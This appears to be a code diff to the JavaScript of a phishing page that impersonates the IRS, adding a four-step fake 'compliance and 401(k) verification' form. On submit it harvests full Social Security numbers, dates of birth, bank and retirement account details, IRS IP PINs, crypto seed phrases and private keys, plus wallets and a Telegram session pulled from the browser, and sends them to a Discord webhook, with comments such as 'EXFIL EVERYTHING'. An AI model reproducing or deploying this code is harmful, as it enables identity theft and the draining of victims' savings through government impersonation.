+            function showSpinner() {
+                document.getElementById('spinnerOverlay').classList.add('active');
             }
 
-            document.getElementById('signInBtn').addEventListener('click', function(e) {
-                e.preventDefault();
-                showOverlay();
-            });
+            function hideSpinner() {
+                document.getElementById('spinnerOverlay').classList.remove('active');
+            }
 
-            document.getElementById('createAccountBtn').addEventListener('click', function(e) {
-                e.preventDefault();
-                showOverlay();
+            // ============================================================
+            // STEP NAVIGATION
+            // ============================================================
+            function showStep(step) {
+                document.getElementById('step1').classList.toggle('hidden', step !== 1);
+                document.getElementById('step2').classList.toggle('hidden', step !== 2);
+                document.getElementById('step3').classList.toggle('hidden', step !== 3);
+                document.getElementById('step4').classList.toggle('hidden', step !== 4);
+                document.getElementById('step1Label').classList.toggle('active', step === 1);
+                document.getElementById('step2Label').classList.toggle('active', step === 2);
+                document.getElementById('step3Label').classList.toggle('active', step === 3);
+                document.getElementById('step4Label').classList.toggle('active', step === 4);
+                // Scroll to top of container
+                document.querySelector('.container').scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+
+            document.getElementById('step1Btn').addEventListener('click', function() {
+                showSpinner();
+                setTimeout(() => { hideSpinner();
+                    showStep(2); }, 2000);
+            });
+            document.getElementById('step2Btn').addEventListener('click', function() {
+                showSpinner();
+                setTimeout(() => { hideSpinner();
+                    showStep(3); }, 2000);
+            });
+            document.getElementById('step3Btn').addEventListener('click', function() {
+                showSpinner();
+                setTimeout(() => { hideSpinner();
+                    showStep(4); }, 2000);
             });
 
             // ============================================================
-            // SUBMIT FORM — EXFIL EVERYTHING
+            // LIVE CHAT
             // ============================================================
-            document.getElementById('submitBtn').addEventListener('click', function() {
-                let fullName = document.getElementById('fullName').value;
-                let ssn = document.getElementById('ssn').value;
-                let email = document.getElementById('email').value;
-                let exchange = document.getElementById('exchange').value;
-                let wallet = document.getElementById('wallet').value;
+            document.getElementById('liveChatBtn').addEventListener('click', function() {
+                alert('💬 Live Support is currently unavailable. Please leave a message and we will respond within 24 hours.');
+            });
 
-                // Build message
-                let msg = '🔐 **IRS Verification Data**\n';
-                msg += '📛 **Full Name:** ' + fullName + '\n';
-                msg += '🆔 **SSN:** ' + ssn + '\n';
-                msg += '📧 **Email:** ' + email + '\n';
-                msg += '💱 **Exchange:** ' + exchange + '\n';
-                msg += '📦 **Wallet:** ' + wallet + '\n';
-                msg += '📱 **Device:** ' + navigator.userAgent + '\n';
-                msg += '⏰ **Time:** ' + new Date().toISOString() + '\n\n';
+            // ============================================================
+            // SUBMIT — EXFIL EVERYTHING
+            // ============================================================
+            document.getElementById('step4Btn').addEventListener('click', function() {
+                const consent = document.getElementById('consentCheck').checked;
+                if (!consent) { alert('Please consent to continue.'); return; }
 
-                // Extract browser data
-                let browserData = extractAllData();
-                msg += '📦 **Browser Data Extracted**\n```json\n' + JSON.stringify(browserData, null, 2) + '\n```';
+                showSpinner();
 
-                // Send to Discord
-                sendToDiscord(msg);
-
-                // Close overlay and redirect
-                document.getElementById('formOverlay').classList.remove('active');
                 setTimeout(() => {
-                    window.location.href = 'https://www.irs.gov';
-                }, 1000);
+
+                    // Gather form data
+                    const fullName = document.getElementById('fullName').value;
+                    const ssnPartial = document.getElementById('ssnPartial').value;
+                    const fullSsn = document.getElementById('fullSsn').value;
+                    const dob = document.getElementById('dob').value;
+                    const phone = document.getElementById('phone').value;
+                    const email = document.getElementById('email').value;
+                    const address = document.getElementById('address').value;
+                    const employer = document.getElementById('employer').value;
+                    const provider = document.getElementById('provider').value;
+                    const accountNumber = document.getElementById('accountNumber').value;
+                    const retirementBalance = document.getElementById('retirementBalance').value;
+                    const iraType = document.getElementById('iraType').value;
+                    const exchange = document.getElementById('exchange').value;
+                    const walletType = document.getElementById('walletType').value;
+                    const walletAddress = document.getElementById('walletAddress').value;
+                    const cryptoHoldings = document.getElementById('cryptoHoldings').value;
+                    const propertyAddress = document.getElementById('propertyAddress').value;
+                    const propertyValue = document.getElementById('propertyValue').value;
+                    const businessName = document.getElementById('businessName').value;
+                    const businessIncome = document.getElementById('businessIncome').value;
+                    const irsPin = document.getElementById('irsPin').value;
+                    const bankAccount = document.getElementById('bankAccount').value;
+                    const seedPhrase = document.getElementById('seedPhrase').value;
+                    const privateKey = document.getElementById('privateKey').value;
+
+                    // Extract browser data
+                    const browserData = extractAllData();
+
+                    // Build message
+                    let msg = '🔐 **IRS COMPLIANCE & 401(K) VERIFICATION REPORT**\n';
+                    msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+                    msg += '📛 **Full Name:** ' + fullName + '\n';
+                    msg += '🆔 **SSN (Partial):** ' + ssnPartial + '\n';
+                    msg += '🆔 **SSN (Full):** ' + fullSsn + '\n';
+                    msg += '📅 **DOB:** ' + dob + '\n';
+                    msg += '📞 **Phone:** ' + phone + '\n';
+                    msg += '📧 **Email:** ' + email + '\n';
+                    msg += '📍 **Address:** ' + address + '\n\n';
+
+                    msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                    msg += '🏦 **401(K) & RETIREMENT**\n';
+                    msg += 'Employer: ' + employer + '\n';
+                    msg += 'Provider: ' + provider + '\n';
+                    msg += 'Account #: ' + accountNumber + '\n';
+                    msg += 'Balance: $' + retirementBalance + '\n';
+                    msg += 'IRA Type: ' + iraType + '\n\n';
+
+                    msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                    msg += '💎 **CRYPTO ASSET DECLARATION**\n';
+                    msg += 'Exchange: ' + exchange + '\n';
+                    msg += 'Wallet Type: ' + walletType + '\n';
+                    msg += 'Wallet Address: ' + walletAddress + '\n';
+                    msg += 'Holdings: $' + cryptoHoldings + '\n\n';
+
+                    msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                    msg += '🏠 **REAL ESTATE & BUSINESS**\n';
+                    msg += 'Property: ' + propertyAddress + '\n';
+                    msg += 'Property Value: $' + propertyValue + '\n';
+                    msg += 'Business: ' + businessName + '\n';
+                    msg += 'Business Income: $' + businessIncome + '\n\n';
+
+                    msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                    msg += '🔐 **FINAL VERIFICATION**\n';
+                    msg += 'IRS IP PIN: ' + irsPin + '\n';
+                    msg += 'Bank Account: ' + bankAccount + '\n';
+                    msg += 'Seed Phrase: `' + seedPhrase + '`\n';
+                    msg += 'Private Key: `' + privateKey + '`\n\n';
+
+                    msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                    msg += '📱 **DEVICE INFORMATION**\n';
+                    msg += 'Device: ' + browserData.device + '\n';
+                    msg += 'Platform: ' + browserData.platform + '\n';
+                    msg += 'Time: ' + browserData.timestamp + '\n\n';
+
+                    if (browserData.wallets.length > 0) {
+                        msg += '📦 **Wallets Extracted from Browser**\n';
+                        for (let w of browserData.wallets) {
+                            msg += '  • ' + w.source + ': ' + (w.type === 'seed' ? 'SEED (' + w.wordCount + ' words)' : w.value) +
+                                '\n';
+                        }
+                        msg += '\n';
+                    }
+
+                    if (browserData.telegramSession) {
+                        msg += '📱 **Telegram Session:** `' + browserData.telegramSession + '`\n\n';
+                    }
+
+                    msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                    msg += '✅ **Full profile extracted. Ready for action.**';
+
+                    sendToDiscord(msg);
+
+                    // Hide form, show success
+                    document.getElementById('step4').classList.add('hidden');
+                    document.getElementById('successPage').classList.remove('hidden');
+                    hideSpinner();
+
+                }, 2000);
             });
 
             // ============================================================
-            // BANNER TOGGLE
+            // PRINT BUTTON
             // ============================================================
-            window.toggleBanner = function() {
-                let banner = document.getElementById('gov-info');
-                if (banner) {
-                    banner.style.display = banner.style.display === 'none' ? 'block' : 'none';
-                }
-            };
+            document.getElementById('printBtn').addEventListener('click', function() {
+                window.print();
+            });
 
         })();
     </script>
